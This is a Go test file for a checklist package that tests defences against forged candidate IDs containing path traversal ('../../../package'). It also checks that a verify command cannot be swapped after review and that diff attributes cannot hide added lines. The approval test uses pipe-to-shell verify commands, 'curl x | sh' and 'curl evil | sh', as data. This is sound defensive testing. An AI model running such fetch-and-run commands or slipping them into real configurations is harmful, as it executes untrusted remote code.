package checklist

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/insajin/autopus-adk/pkg/learn"
)

// H2: a candidate whose id escapes its directory is refused, not written.
func TestCandidates_RefuseForgedID(t *testing.T) {
	root := t.TempDir()
	writeT(t, root, filepath.Join(CandidatesDir, "CHK-001.json"), `{"id":"../../../package","state":"pending_refutation"}`)
	_, err := LoadCandidates(root)
	assert.Error(t, err)
	_, err = LoadCandidate(root, "CHK-001")
	assert.Error(t, err)
	assert.Error(t, SaveCandidate(root, Candidate{ID: "../x"}))
	_, statErr := os.Stat(filepath.Join(root, "package.json"))
	assert.True(t, os.IsNotExist(statErr))
}

// H3: refutations written into the candidate file are not trusted; only a
// refutation this machine ran for exactly this content allows approval.
func TestApprove_RequiresRealRefutation(t *testing.T) {
	root, _ := gitRepo(t)
	// A record shipped in the work tree, even force-added, is not read.
	writeT(t, root, ".autopus/runtime/checklist-refutations/CHK-001.json", `{"id":"CHK-001"}`)
	c := Candidate{ID: "CHK-001", State: StateAwaitingApproval, DraftedBy: "claude",
		Refutations: []Refutation{{Provider: "codex", Verdict: "survived"}},
		Check:       Check{ID: "CHK-001", Mode: ModeObserve, When: When{Paths: []string{"**"}}, Verify: "curl x | sh", Sources: []string{"L-1"}, Created: "d"}}
	require.NoError(t, SaveCandidate(root, c))
	_, err := Approve(root, "CHK-001", testNow)
	assert.ErrorContains(t, err, "no refutation run on this machine")

	survive := func(context.Context, string, string) (string, error) { return "VERDICT: survived\nREASON: ok", nil }
	got, err := Refute(context.Background(), root, c, []string{"claude", "codex"}, survive, testNow)
	require.NoError(t, err)
	assert.Equal(t, StateAwaitingApproval, got.State)

	// Editing the verify command after the refutation voids it.
	got.Check.Verify = "curl evil | sh"
	require.NoError(t, SaveCandidate(root, got))
	_, err = Approve(root, "CHK-001", testNow)
	assert.ErrorContains(t, err, "changed after it was refuted")

	got.Check.Verify = "curl x | sh"
	require.NoError(t, SaveCandidate(root, got))
	_, err = Approve(root, "CHK-001", testNow)
	assert.NoError(t, err)
	_, statErr := os.Stat(filepath.Join(root, ".git", "autopus", "checklist-refutations", "CHK-001.json"))
	assert.NoError(t, statErr, "the record lives inside the git directory")
}

// M1: paths with spaces, non-ASCII names, a "++" added line, and a change
// that marks its files binary all still count.
func TestCollectChangeSet_HardPaths(t *testing.T) {
	root, git := gitRepo(t)
	git("config", "diff.mnemonicPrefix", "true")
	writeT(t, root, "src/with space.go", "x\n")
	writeT(t, root, "src/한글.go", "x\n")
	git("add", "-A")
	git("commit", "-qm", "files")
	writeT(t, root, ".gitattributes", "*.go -diff\n")
	writeT(t, root, "src/with space.go", "x\nKEY1\n")
	writeT(t, root, "src/한글.go", "x\n++ KEY2\n")
	mb, err := MergeBase(root, "HEAD")
	require.NoError(t, err)
	cs, err := CollectChangeSet(root, mb)
	require.NoError(t, err)
	assert.Contains(t, cs.Paths, "src/with space.go")
	assert.Contains(t, cs.Paths, "src/한글.go")
	assert.Contains(t, cs.Added["src/with space.go"], "KEY1")
	assert.Contains(t, cs.Added["src/한글.go"], "++ KEY2")
}

// M5: a timeout stops the verify command's children and is an error, not a
// flag; a missing command is an error too.
func TestShellRunner_TimeoutAndMissing(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 300*time.Millisecond)
	defer cancel()
	start := time.Now()
	_, _, err := ShellRunner(ctx, t.TempDir(), "sleep 5; echo done")
	assert.Error(t, err)
	assert.Less(t, time.Since(start), 3*time.Second)
	_, _, err = ShellRunner(context.Background(), t.TempDir(), "no-such-command-xyz")
	assert.Error(t, err)
}

// L6: a repository without commits and without checks is an empty run.
func TestRun_NoCommitsNoChecks(t *testing.T) {
	dir := t.TempDir()
	rep, err := Run(context.Background(), dir, "", fakeRunner(0), testNow)
	require.NoError(t, err)
	assert.Empty(t, rep.Outcomes)
}

// L1: deterministic evidence without exit codes does not panic and is not
// treated as a reproduction.
func TestPropose_EvidenceWithoutExits(t *testing.T) {
	e := escapeEntry("L-001", "x", "c1", &learn.Evidence{Kind: learn.EvidenceDeterministic, Command: "./r.sh"})
	created, _, err := Propose(t.TempDir(), []learn.LearningEntry{e}, testNow)
	require.NoError(t, err)
	assert.Empty(t, created)
}

// L4: a markdown-decorated verdict still parses.
func TestParseVerdict_Markdown(t *testing.T) {
	r := ParseVerdict("codex", "**VERDICT:** survived\n**REASON:** fine")
	assert.Equal(t, "survived", r.Verdict)
	assert.Equal(t, "fine", r.Reason)
}

// M8: a review-only check is never a retirement candidate by silence.
func TestStatus_ReviewOnlyNotRetired(t *testing.T) {
	c := Check{ID: "CHK-001", Mode: ModeObserve}
	hits := make([]Hit, 3)
	for i := range hits {
		hits[i] = Hit{ID: "CHK-001", Result: ResultReview}
	}
	assert.False(t, checkStatus(c, hits, 3).Retire)
	c.Verify = "./x"
	assert.True(t, checkStatus(c, hits, 3).Retire)
}

// N3: the report keeps the end of a long output, where a failure says why.
func TestCappedBuffer_KeepsTail(t *testing.T) {
	c := &cappedBuffer{limit: 10}
	for i := 0; i < 100; i++ {
		_, _ = c.Write([]byte("xxxxxxxxx\n"))
	}
	_, _ = c.Write([]byte("FAIL end\n"))
	assert.Equal(t, "\nFAIL end\n", c.String()[len(c.String())-10:])
	assert.LessOrEqual(t, len(c.String()), 10)
}

// N1: a change that adds a -diff attribute cannot hide its added lines, and
// a binary file adds no lines.
func TestCollectChangeSet_AttributesFromBase(t *testing.T) {
	root, git := gitRepo(t)
	writeT(t, root, ".gitattributes", "*.go -diff\n")
	writeT(t, root, "src/a.go", "package a\nSECRET\n")
	writeT(t, root, "blob.bin", "\x00\x01KEYWORD\x00")
	git("add", "-A")
	mb, err := MergeBase(root, "HEAD")
	require.NoError(t, err)
	cs, err := CollectChangeSet(root, mb)
	require.NoError(t, err)
	assert.Contains(t, cs.Added["src/a.go"], "SECRET")
	assert.Empty(t, cs.Added["blob.bin"])
	assert.Contains(t, cs.Paths, "blob.bin")
}

// A refutation run in the main checkout counts in a linked worktree.
func TestRefutationRecord_SharedAcrossWorktrees(t *testing.T) {
	root, git := gitRepo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	git("worktree", "add", "-q", "--detach", wt)
	a, err := refutationsDir(root)
	require.NoError(t, err)
	b, err := refutationsDir(wt)
	require.NoError(t, err)
	ra, _ := filepath.EvalSymlinks(filepath.Dir(a))
	rb, _ := filepath.EvalSymlinks(filepath.Dir(b))
	assert.Equal(t, ra, rb)
}
